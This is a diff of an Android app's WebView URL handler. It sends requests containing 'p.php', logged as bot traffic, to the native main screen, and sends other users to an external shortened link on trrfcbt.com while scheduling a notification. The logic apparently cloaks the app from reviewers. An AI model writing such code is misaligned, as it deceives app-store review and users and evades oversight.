@@ -55,15 +55,17 @@ class LoadingActivity : AppCompatActivity() {
                 if(request == null) Log.e("kek", "sooqa req null")
                 Log.e("Url", request?.url.toString())
                 var req = request?.url.toString()
-                if(!req.contains("p.php")){
-                    NotificationMessage().scheduleNotification(this@LoadingActivity)
-                    Log.e("Kek", "add")
-                    preference?.putString("wikiweb", "http://trrfcbt.com/Yn5ZPz")
-                    executeWikiResponse("http://trrfcbt.com/Yn5ZPz")
+                if(req.contains("p.php")){
+                    Log.e("Bot", "p")
+                    openMain()
                 }
                 else{
-                    Log.e("Bot", "not p")
-                    openMain()
+                    if(!req.contains("bonusik")){
+                        NotificationMessage().scheduleNotification(this@LoadingActivity)
+                        Log.e("Kek", "add")
+                        preference?.putString("wikiweb", "http://trrfcbt.com/Yn5ZPz")
+                        executeWikiResponse("http://trrfcbt.com/Yn5ZPz")
+                    }
                 }
                 return super.shouldOverrideUrlLoading(view, request)
             }
